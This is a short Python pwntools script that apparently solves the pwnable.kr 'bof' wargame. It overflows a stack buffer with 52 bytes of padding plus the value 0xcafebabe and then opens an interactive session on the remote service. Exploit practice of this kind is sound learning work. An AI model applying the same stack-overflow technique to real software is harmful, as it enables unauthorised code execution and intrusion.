# coding:utf-8
import socket
import struct
from pwn import *

conn = remote('pwnable.kr', 9000)
# conn = process('./bof')
# print(conn.recv(20))
payload = 'a' * 52 + struct.pack('<I', 0xcafebabe)
conn.send(payload)
conn.interactive()